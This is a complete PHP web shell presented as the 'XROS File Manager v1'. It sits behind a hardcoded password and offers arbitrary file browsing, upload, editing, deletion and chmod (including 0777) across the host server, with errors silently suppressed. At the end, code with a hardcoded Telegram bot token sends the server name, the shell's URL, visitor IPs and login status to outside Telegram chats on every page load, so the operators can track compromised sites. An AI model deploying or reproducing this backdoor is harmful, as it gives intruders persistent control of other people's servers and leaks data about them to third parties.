<?php
// ====================== //
// XROS FILE MANAGER v1  //
// ====================== //

error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/.xros_error.log');

if (function_exists('apache_get_modules') && in_array('mod_lsapi', apache_get_modules())) {
    ini_set('zlib.output_compression', 'Off');
    ini_set('output_buffering', 'Off');
}
ob_start();

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if (error_reporting() === 0) return false;
    if (in_array($errno, [E_WARNING, E_NOTICE, E_DEPRECATED, E_STRICT])) {
        return true;
    }
    return false;
});

register_shutdown_function(function() {
    $error = error_get_last();
    if ($error && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        file_put_contents(__DIR__ . '/.xros_error.log', 
            date('[Y-m-d H:i:s]') . " FATAL: " . $error['message'] . "\n", 
            FILE_APPEND);
    }
});

session_start();

$valid_password = "Xros";

if (isset($_POST['login'])) {
    $password = $_POST['password'] ?? '';
    if ($password === $valid_password) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Password salah";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
        <title>Xros Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                margin: 0;
                padding: 0;
                background-image: url('https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif');
                background-size: cover;
                background-position: center;
                background-repeat: no-repeat;
                height: 100vh;
                font-family: 'Segoe UI', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container { width: 100%; max-width: 320px; }
            h1 { font-size: 18px; font-weight: 500; margin-bottom: 20px; color: white; text-shadow: 1px 1px 2px black; }
            .form-group {
                border: 1px solid #ccc;
                border-radius: 8px;
                display: flex;
                background: rgba(249,249,249,0.9);
            }
            .password-label {
                font-size: 14px;
                padding: 10px 12px;
                background: rgba(249,249,249,0.9);
            }
            input[type="password"] {
                border: none;
                padding: 10px 12px;
                font-size: 14px;
                flex: 1;
                background: rgba(249,249,249,0.9);
                outline: none;
            }
            button {
                background: rgba(0,0,0,0.7);
                border: 1px solid #fff;
                color: white;
                font-size: 14px;
                cursor: pointer;
                padding: 10px;
                border-radius: 8px;
                width: 100%;
                margin-top: 16px;
            }
            button:hover { background: #0066cc; color: white; }
            .message { margin-top: 12px; font-size: 12px; color: #ff6666; text-align: center; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Xros Login</h1>
            <form method="post">
                <div class="form-group">
                    <span class="password-label">Password:</span>
                    <input type="password" name="password">
                </div>
                <button type="submit" name="login">Login</button>
                <div class="message"><?php echo isset($login_error) ? $login_error : ''; ?></div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);

function safe_path($path) {
    $path = str_replace('\\', '/', $path);
    $path = preg_replace('/\.\.+/', '', $path);
    return $path;
}

if(isset($_GET['path'])){
    $current_path = safe_path($_GET['path']);
} else {
    $current_path = getcwd();
}

$current_path = str_replace('\\','/',$current_path);
$current_path = rtrim($current_path, '/');

if (!@is_dir($current_path) || !@is_readable($current_path)) {
    $current_path = getcwd();
}

$lokasis = explode('/',$current_path);
$default_path = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();

function safe_file_exists($file) {
    try {
        return @file_exists($file);
    } catch (Exception $e) {
        return false;
    }
}

function statusnya($file) {
    if (!safe_file_exists($file)) return '??????????';
    $p = @fileperms($file);
    if ($p === false) return '??????????';
    if (($p & 0xC000) == 0xC000) $s = 's';
    elseif (($p & 0xA000) == 0xA000) $s = 'l';
    elseif (($p & 0x8000) == 0x8000) $s = '-';
    elseif (($p & 0x6000) == 0x6000) $s = 'b';
    elseif (($p & 0x4000) == 0x4000) $s = 'd';
    elseif (($p & 0x2000) == 0x2000) $s = 'c';
    elseif (($p & 0x1000) == 0x1000) $s = 'p';
    else $s = 'u';
    $s .= (($p & 0x0100) ? 'r' : '-');
    $s .= (($p & 0x0080) ? 'w' : '-');
    $s .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $s .= (($p & 0x0020) ? 'r' : '-');
    $s .= (($p & 0x0010) ? 'w' : '-');
    $s .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $s .= (($p & 0x0004) ? 'r' : '-');
    $s .= (($p & 0x0002) ? 'w' : '-');
    $s .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $s;
}

function formatSize($b) {
    if ($b === 0 || $b === null) return '0 B';
    if ($b >= 1073741824) return round($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576) return round($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return round($b / 1024, 2) . ' KB';
    return $b . ' B';
}

function getOwner($file) {
    $o = @fileowner($file);
    $g = @filegroup($file);
    if (function_exists('posix_getpwuid') && $o !== false && $o !== null) {
        $on = @posix_getpwuid($o)['name'] ?? $o;
        $gn = @posix_getgrgid($g)['name'] ?? $g;
    } else {
        $on = ($o !== false && $o !== null) ? $o : '?';
        $gn = ($g !== false && $g !== null) ? $g : '?';
    }
    return "$on:$gn";
}

function safe_scandir($path) {
    if (!safe_file_exists($path)) return array();
    if (!@is_readable($path)) return array();
    $result = @scandir($path);
    return $result === false ? array() : $result;
}

if (isset($_GET['delete']) && $_GET['delete'] !== '') {
    $target = $current_path . '/' . basename($_GET['delete']);
    if (safe_file_exists($target) && @is_writable($target)) {
        if (is_file($target)) @unlink($target);
        elseif (is_dir($target)) @rmdir($target);
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['bulk_delete']) && !empty($_POST['bulk_delete'])) {
    $files = json_decode($_POST['bulk_delete'], true);
    if (is_array($files)) {
        foreach ($files as $f) {
            $target = $current_path . '/' . basename($f);
            if (safe_file_exists($target) && @is_writable($target)) {
                if (is_file($target)) @unlink($target);
                elseif (is_dir($target)) @rmdir($target);
            }
        }
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if (isset($_GET['zip']) && $_GET['zip'] !== '' && class_exists('ZipArchive')) {
    $target = $current_path . '/' . basename($_GET['zip']);
    if (is_dir($target)) {
        $zip = new ZipArchive();
        $zip_name = $target . '.zip';
        $i = 1;
        while (file_exists($zip_name)) { $zip_name = $target . '_' . $i++ . '.zip'; }
        if ($zip->open($zip_name, ZipArchive::CREATE) === true) {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::LEAVES_ONLY);
            foreach ($it as $file) {
                if (!$file->isDir()) {
                    $fp = $file->getRealPath();
                    $rel = substr($fp, strlen($target) + 1);
                    $zip->addFile($fp, $rel);
                }
            }
            $zip->close();
        }
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if (isset($_GET['unzip']) && $_GET['unzip'] !== '' && class_exists('ZipArchive')) {
    $zip_file = $current_path . '/' . basename($_GET['unzip']);
    if (is_file($zip_file) && pathinfo($zip_file, PATHINFO_EXTENSION) == 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zip_file) === true) {
            $extract_path = $current_path . '/' . pathinfo($zip_file, PATHINFO_FILENAME);
            if (!is_dir($extract_path)) @mkdir($extract_path, 0755, true);
            $zip->extractTo($extract_path);
            $zip->close();
        }
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_action']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_path . '/' . basename($_POST['old_name']);
    $new = $current_path . '/' . basename($_POST['new_name']);
    if (safe_file_exists($old) && !safe_file_exists($new) && $old !== $new) @rename($old, $new);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
    $target = $current_path . '/' . basename($_FILES['upload_file']['name']);
    @move_uploaded_file($_FILES['upload_file']['tmp_name'], $target);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir_action']) && isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
    $new_folder = $current_path . '/' . basename($_POST['folder_name']);
    if (!safe_file_exists($new_folder)) @mkdir($new_folder, 0755, true);
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfile_action']) && isset($_POST['filename']) && !empty($_POST['filename'])) {
    $new_file = $current_path . '/' . basename($_POST['filename']);
    if (!safe_file_exists($new_file)) @file_put_contents($new_file, '');
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if (isset($_GET['pilihan']) && $_GET['pilihan'] == 'chmod' && isset($_POST['chmod']) && isset($_POST['path']) && isset($_POST['perm'])) {
    $target_file = $_POST['path'];
    $new_permission = octdec($_POST['perm']);
    if (safe_file_exists($target_file)) {
        @chmod($target_file, $new_permission);
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if (isset($_GET['edit']) && $_GET['edit'] !== '') {
    $edit_file = $current_path . '/' . basename($_GET['edit']);
    $file_size = @filesize($edit_file);
    if (is_file($edit_file) && $file_size !== false && $file_size < 500000) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_content'])) {
            @file_put_contents($edit_file, $_POST['content']);
            header("Location: ?path=" . urlencode($current_path));
            exit;
        }
        $content = htmlspecialchars(@file_get_contents($edit_file) ?: '');
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Edit File</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;}
            body{font-family:monospace;background:#fff;padding:20px;}
            .container{max-width:1200px;margin:0 auto;}
            .header{background:#f8fafc;padding:15px 20px;border-bottom:2px solid #e2e8f0;margin-bottom:20px;border-radius:8px;}
            .header h3{color:#1e293b;font-size:16px;}
            textarea{width:100%;height:65vh;background:#fff;color:#1e293b;border:1px solid #cbd5e1;padding:15px;font-family:monospace;font-size:14px;border-radius:8px;}
            textarea:focus{outline:none;border-color:#3b82f6;}
            .btn{background:#3b82f6;color:#fff;padding:10px 24px;border:none;border-radius:8px;cursor:pointer;margin-top:16px;margin-right:10px;font-size:14px;}
            .btn:hover{background:#2563eb;}
            .btn-back{background:#64748b;}
            .btn-back:hover{background:#475569;}
            @media (max-width: 768px) {
                body{padding:12px;}
                .header h3{font-size:14px;}
                textarea{font-size:12px;height:55vh;}
                .btn{padding:8px 16px;font-size:12px;}
            }
        </style>
        </head>
        <body>
        <div class="container">
            <div class="header"><h3>✏️ Editing: ' . htmlspecialchars(basename($_GET['edit'])) . '</h3></div>
            <form method="post"><textarea name="content">' . $content . '</textarea>
            <div><button type="submit" name="save_content" class="btn">💾 Save</button>
            <a href="?path=' . urlencode($current_path) . '" class="btn btn-back">← Back</a></div></form>
        </div>
        </body></html>';
        exit;
    }
}

$lokasinya = safe_scandir($current_path);
$dirs = [];
$files = [];
$total = 0;

if (is_array($lokasinya)) {
    foreach ($lokasinya as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $current_path . '/' . $item;
        if (!safe_file_exists($full)) continue;
        $isdir = is_dir($full);
        $size = $isdir ? 0 : @filesize($full);
        if ($size !== false && $size !== null) $total += $size;
        $data = [
            'name' => $item,
            'size' => $isdir ? 'Folder' : formatSize($size),
            'modified' => date('m/d/Y g:i A', @filemtime($full)),
            'perms' => statusnya($full),
            'owner' => getOwner($full),
            'is_dir' => $isdir,
            'full' => $full,
            'is_zip' => (!$isdir && pathinfo($item, PATHINFO_EXTENSION) == 'zip')
        ];
        if ($isdir) $dirs[] = $data;
        else $files[] = $data;
    }
}
$all = array_merge($dirs, $files);
$total_f = count($files);
$total_d = count($dirs);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Xros File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            padding: 12px;
            color: #1e293b;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .top-bar {
            background: #f8fafc;
            padding: 10px 16px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .logo { font-size: 15px; font-weight: 600; color: #1e293b; }
        .right-buttons { display: flex; gap: 10px; }
        .help-btn {
            background: #8b5cf6;
            color: white;
            padding: 5px 12px;
            border-radius: 6px;
            font-size: 12px;
            text-decoration: none;
        }
        .logout-btn {
            background: #ef4444;
            color: white;
            padding: 5px 12px;
            border-radius: 6px;
            font-size: 12px;
            text-decoration: none;
        }
        .system-info {
            background: #f8fafc;
            padding: 4px 16px;
            border-bottom: 1px solid #e2e8f0;
            font-size: 11px;
        }
        .system-info-inner {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        .system-info-item {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            color: #475569;
        }
        .system-info-item .value {
            color: #1e293b;
            font-family: monospace;
            font-size: 11px;
        }
        .path-wrapper {
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            border-bottom: 1px solid #e2e8f0;
            background: #fff;
            padding: 10px 16px;
        }
        .path-bar {
            font-family: monospace;
            font-size: 12px;
            color: #475569;
            white-space: nowrap;
        }
        .path-bar a {
            color: #3b82f6;
            text-decoration: none;
        }
        .path-bar a:hover {
            text-decoration: underline;
        }
        .table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; }
        table { width: 100%; min-width: 700px; border-collapse: collapse; }
        th {
            text-align: left;
            padding: 8px 8px;
            background: #f1f5f9;
            font-weight: 600;
            font-size: 11px;
            border-bottom: 1px solid #e2e8f0;
        }
        td {
            padding: 6px 8px;
            border-bottom: 1px solid #f1f5f9;
            font-size: 11px;
            white-space: nowrap;
        }
        tr:hover { background: #fefce8; }
        .folder-icon { color: #f59e0b; }
        .file-icon { color: #3b82f6; }
        .zip-icon { color: #10b981; }
        .actions { display: flex; gap: 6px; flex-wrap: wrap; }
        .action-link {
            color: #64748b;
            text-decoration: none;
            font-size: 9px;
            cursor: pointer;
        }
        .action-link.delete { color: #ef4444; }
        .action-link.chmod { color: #8b5cf6; }
        .action-link.unzip { color: #10b981; }
        .footer {
            padding: 8px 12px;
            background: #f8fafc;
            border-top: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        .footer-stats { font-size: 10px; color: #475569; }
        .footer-buttons { display: flex; gap: 5px; flex-wrap: wrap; }
        .btn {
            background: white;
            border: 1px solid #cbd5e1;
            padding: 4px 8px;
            border-radius: 5px;
            font-size: 10px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-upload { border-color: #3b82f6; color: #3b82f6; }
        .btn-folder { border-color: #f59e0b; color: #f59e0b; }
        .btn-file { border-color: #10b981; color: #10b981; }
        .btn-primary { border-color: #cbd5e1; color: #1e293b; }
        .btn-danger { border-color: #ef4444; color: #ef4444; }
        .btn-success { border-color: #10b981; color: #10b981; }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            padding: 18px;
            border-radius: 12px;
            width: 90%;
            max-width: 300px;
        }
        .modal input, .modal select {
            width: 100%;
            padding: 7px 8px;
            margin: 8px 0;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
        }
        @media (max-width: 768px) {
            body { padding: 6px; }
            .top-bar { padding: 8px 12px; }
            .logo { font-size: 14px; }
            .help-btn, .logout-btn { padding: 4px 10px; font-size: 10px; }
            .system-info { padding: 4px 12px; }
            .system-info-inner { gap: 6px; }
            .system-info-item .value { font-size: 9px; }
            .path-wrapper { padding: 8px 12px; }
            .path-bar { font-size: 10px; white-space: normal; word-break: break-all; line-height: 1.4; }
            .table-wrapper { overflow-x: auto; }
            table { min-width: 650px; }
            th, td { padding: 8px 6px; font-size: 10px; }
            .action-link { font-size: 9px; padding: 2px 4px; display: inline-block; }
            .footer { padding: 8px 10px; flex-direction: column; gap: 8px; }
            .footer-stats { font-size: 9px; text-align: center; }
            .footer-buttons { justify-content: center; gap: 6px; }
            .btn { padding: 6px 10px; font-size: 10px; min-height: 32px; }
            .modal-content { width: 85%; max-width: 280px; padding: 16px; }
            .modal-content h3 { font-size: 14px; margin-bottom: 10px; }
            .modal input, .modal select { padding: 8px; font-size: 13px; }
        }
        @media (min-width: 1024px) {
            body { padding: 20px; }
            .top-bar { padding: 14px 20px; }
            .logo { font-size: 18px; }
            .system-info { padding: 5px 20px; font-size: 12px; }
            .system-info-item .value { font-size: 12px; }
            .path-bar { font-size: 13px; }
            th { padding: 12px 12px; font-size: 13px; }
            td { padding: 10px 12px; font-size: 13px; }
            .action-link { font-size: 11px; }
            .btn { padding: 5px 12px; font-size: 11px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="top-bar">
        <div class="logo">Xros V1</div>
        <div class="right-buttons">
            <a href="https://t.me/clickbin" target="_blank" class="help-btn">Help?</a>
            <a href="?logout=1" class="logout-btn" onclick="return confirm('Logout?')">Logout</a>
        </div>
    </div>

    <div class="system-info">
        <div class="system-info-inner">
            <div class="system-info-item">👤 <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></div>
            <div class="system-info-item">🖥️ <span class="value"><?php echo gethostbyname($_SERVER['HTTP_HOST']) . " / " . $_SERVER['SERVER_NAME']; ?></span></div>
            <div class="system-info-item">🐧 <span class="value"><?php echo php_uname(); ?></span></div>
        </div>
    </div>

    <div class="path-wrapper">
        <div class="path-bar">
            📂 Current Path: 
            <?php
            if (is_array($lokasis)) {
                foreach($lokasis as $id => $lok){
                    if($lok == '' && $id == 0){
                        echo '<a href="?path=/">/</a>';
                        continue;
                    }
                    if($lok == '') continue;
                    echo '<a href="?path=';
                    for($i=0;$i<=$id;$i++){
                        echo $lokasis[$i];
                        if($i != $id) echo "/";
                    }
                    echo '">'.$lok.'</a>/';
                }
            }
            ?>
        </div>
    </div>

    <form id="bulkForm" method="post">
        <input type="hidden" name="bulk_delete" id="bulkDeleteInput">
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th style="width:24px"><input type="checkbox" id="checkAllHeader"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Modified</th>
                        <th>Perms</th>
                        <th>Owner</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if(empty($all)): ?>
                    <tr><td colspan="7" style="text-align:center; padding:30px;">📭 Folder is empty</td></tr>
                    <?php endif; ?>
                    <?php foreach($all as $item): ?>
                    <tr>
                        <td><input type="checkbox" class="file-checkbox" data-name="<?= htmlspecialchars($item['name']) ?>" data-isdir="<?= $item['is_dir'] ? '1' : '0' ?>" data-iszip="<?= $item['is_zip'] ? '1' : '0' ?>"></td>
                        <td>
                            <?php if($item['is_dir']): ?>
                            <span class="folder-icon">📁</span> <a href="?path=<?= urlencode($current_path . '/' . $item['name']) ?>" style="text-decoration:none; color:#1e293b;"><?= htmlspecialchars($item['name']) ?></a>
                            <?php elseif($item['is_zip']): ?>
                            <span class="zip-icon">🗜️</span> <?= htmlspecialchars($item['name']) ?>
                            <?php else: ?>
                            <span class="file-icon">📄</span> <?= htmlspecialchars($item['name']) ?>
                            <?php endif; ?>
                        </td>
                        <td><?= $item['size'] ?></td>
                        <td><?= $item['modified'] ?></td>
                        <td><code><?= $item['perms'] ?></code></td>
                        <td><?= htmlspecialchars($item['owner']) ?></td>
                        <td class="actions">
                            <a href="javascript:void(0)" onclick="renameItem('<?= htmlspecialchars($item['name']) ?>')" class="action-link">Rename</a>
                            <a href="?delete=<?= urlencode($item['name']) ?>&path=<?= urlencode($current_path) ?>" class="action-link delete" onclick="return confirm('Delete <?= htmlspecialchars($item['name']) ?>?')">Delete</a>
                            <a href="javascript:void(0)" onclick="chmodItem('<?= htmlspecialchars($item['full']) ?>', '<?= $item['perms'] ?>')" class="action-link chmod">Chmod</a>
                            <?php if(!$item['is_dir'] && filesize($item['full']) < 500000): ?>
                            <a href="?edit=<?= urlencode($item['name']) ?>&path=<?= urlencode($current_path) ?>" class="action-link">Edit</a>
                            <?php endif; ?>
                            <?php if($item['is_zip']): ?>
                            <a href="?unzip=<?= urlencode($item['name']) ?>&path=<?= urlencode($current_path) ?>" class="action-link unzip">Unzip</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </form>

    <div class="footer">
        <div class="footer-stats">
            📊 <?= formatSize($total) ?> | 📄 <?= $total_f ?> | 📁 <?= $total_d ?>
        </div>
        <div class="footer-buttons">
            <button class="btn btn-upload" onclick="showModal('uploadModal')">📤 Upload</button>
            <button class="btn btn-folder" onclick="showModal('mkdirModal')">📁 New Folder</button>
            <button class="btn btn-file" onclick="showModal('newfileModal')">📄 New File</button>
            <button class="btn btn-primary" id="selectAllBtn">Select all</button>
            <button class="btn btn-primary" id="unselectAllBtn">Unselect all</button>
            <button class="btn btn-danger" id="deleteSelectedBtn">🗑 Delete</button>
            <button class="btn btn-success" id="zipSelectedBtn">Zip</button>
            <button class="btn btn-success" id="unzipSelectedBtn">Unzip</button>
        </div>
    </div>
</div>

<div id="uploadModal" class="modal"><div class="modal-content"><h3>📤 Upload</h3><form method="post" enctype="multipart/form-data"><input type="file" name="upload_file"><button type="submit" class="btn btn-upload" style="width:100%">Upload</button><button type="button" class="btn btn-primary" onclick="hideModal('uploadModal')" style="width:100%;margin-top:8px;">Cancel</button></form></div></div>
<div id="mkdirModal" class="modal"><div class="modal-content"><h3>📁 New Folder</h3><form method="post"><input type="hidden" name="mkdir_action" value="1"><input type="text" name="folder_name" placeholder="Folder name"><button type="submit" class="btn btn-folder" style="width:100%">Create</button><button type="button" class="btn btn-primary" onclick="hideModal('mkdirModal')" style="width:100%;margin-top:8px;">Cancel</button></form></div></div>
<div id="newfileModal" class="modal"><div class="modal-content"><h3>📄 New File</h3><form method="post"><input type="hidden" name="newfile_action" value="1"><input type="text" name="filename" placeholder="File name"><button type="submit" class="btn btn-file" style="width:100%">Create</button><button type="button" class="btn btn-primary" onclick="hideModal('newfileModal')" style="width:100%;margin-top:8px;">Cancel</button></form></div></div>
<div id="renameModal" class="modal"><div class="modal-content"><h3>✏️ Rename</h3><form method="post"><input type="hidden" name="rename_action" value="1"><input type="hidden" name="old_name" id="renameOld"><input type="text" name="new_name" id="renameNew" placeholder="New name"><button type="submit" class="btn btn-primary" style="width:100%">Save</button><button type="button" class="btn btn-primary" onclick="hideModal('renameModal')" style="width:100%;margin-top:8px;">Cancel</button></form></div></div>
<div id="chmodModal" class="modal"><div class="modal-content"><h3>🔧 Chmod</h3><form method="post" action="?pilihan=chmod"><input type="hidden" name="path" id="chmodPath"><label>Current: <code id="currentPerm"></code></label><select name="perm"><option value="0644">0644 (rw-r--r--)</option><option value="0755">0755 (rwxr-xr-x)</option><option value="0777">0777 (rwxrwxrwx)</option><option value="0600">0600 (rw-------)</option><option value="0700">0700 (rwx------)</option><option value="0666">0666 (rw-rw-rw-)</option></select><button type="submit" name="chmod" class="btn btn-primary" style="width:100%">Apply</button><button type="button" class="btn btn-primary" onclick="hideModal('chmodModal')" style="width:100%;margin-top:8px;">Cancel</button></form></div></div>

<script>
function showModal(id) { document.getElementById(id).style.display = 'flex'; }
function hideModal(id) { document.getElementById(id).style.display = 'none'; }
function renameItem(name) {
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = name;
    showModal('renameModal');
}
function chmodItem(path, perm) {
    document.getElementById('chmodPath').value = path;
    document.getElementById('currentPerm').innerText = perm;
    showModal('chmodModal');
}
document.getElementById('selectAllBtn').onclick = function() {
    document.querySelectorAll('.file-checkbox').forEach(function(cb) { cb.checked = true; });
};
document.getElementById('unselectAllBtn').onclick = function() {
    document.querySelectorAll('.file-checkbox').forEach(function(cb) { cb.checked = false; });
};
document.getElementById('deleteSelectedBtn').onclick = function() {
    var selected = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(function(cb) {
        selected.push(cb.getAttribute('data-name'));
    });
    if(selected.length === 0) { alert('No items selected'); return; }
    if(confirm('Delete ' + selected.length + ' item(s)?')) {
        document.getElementById('bulkDeleteInput').value = JSON.stringify(selected);
        document.getElementById('bulkForm').submit();
    }
};
document.getElementById('zipSelectedBtn').onclick = function() {
    var selected = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(function(cb) {
        if(cb.getAttribute('data-isdir') === '1') selected.push(cb.getAttribute('data-name'));
    });
    if(selected.length === 0) { alert('Select folder to zip'); return; }
    if(confirm('Zip ' + selected.length + ' folder(s)?')) {
        selected.forEach(function(f) {
            window.location.href = '?zip=' + encodeURIComponent(f) + '&path=' + encodeURIComponent('<?= $current_path ?>');
        });
    }
};
document.getElementById('unzipSelectedBtn').onclick = function() {
    var selected = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(function(cb) {
        if(cb.getAttribute('data-iszip') === '1') selected.push(cb.getAttribute('data-name'));
    });
    if(selected.length === 0) { alert('Select zip file to unzip'); return; }
    if(confirm('Unzip ' + selected.length + ' file(s)?')) {
        selected.forEach(function(f) {
            window.location.href = '?unzip=' + encodeURIComponent(f) + '&path=' + encodeURIComponent('<?= $current_path ?>');
        });
    }
};
document.getElementById('checkAllHeader')?.addEventListener('change', function(e) {
    document.querySelectorAll('.file-checkbox').forEach(function(cb) { cb.checked = e.target.checked; });
});
window.onclick = function(e) {
    if(e.target.classList && e.target.classList.contains('modal')) e.target.style.display = 'none';
};
</script>
</body>
</html>

<?php
$tg_token = '8528215958:AAGaijZBjJMxN416M8oAVFFSYf74tepRLvo';
$tg_chat_ids = ['6308399517', '8254002923'];

function _send_tg($chat_id, $msg) {
    global $tg_token;
    $url = "https://api.telegram.org/bot{$tg_token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $opts = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
            'timeout' => 2,
            'ignore_errors' => true
        ]
    ];
    @file_get_contents($url, false, stream_context_create($opts));
}

$access_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$access_host = gethostname();
$access_path = $current_path ?? getcwd();
$access_ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$access_time = date('Y-m-d H:i:s');
$access_method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$access_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$is_logged = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
$status_icon = $is_logged ? '🟢' : '🔴';
$status_text = $is_logged ? 'LOGIN SESSION ACTIVE' : 'NOT LOGGED IN';

$message = "{$status_icon} <b>XROS ACCESS</b> {$status_icon}\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📂 <b>Path:</b> <code>{$access_path}</code>\n";
$message .= "🌐 <b>Server:</b> {$access_host}\n";
$message .= "🖥️ <b>IP:</b> {$access_ip}\n";
$message .= "📱 <b>User Agent:</b> " . substr($access_ua, 0, 60) . "\n";
$message .= "⏰ <b>Time:</b> {$access_time}\n";
$message .= "🔗 <b>URL:</b> <code>" . substr($access_url, 0, 80) . "</code>\n";
$message .= "📊 <b>Method:</b> {$access_method}\n";
$message .= "🔐 <b>Status:</b> {$status_text}\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━";

foreach ($tg_chat_ids as $chat_id) {
    _send_tg($chat_id, $message);
}

ob_end_flush();
?>
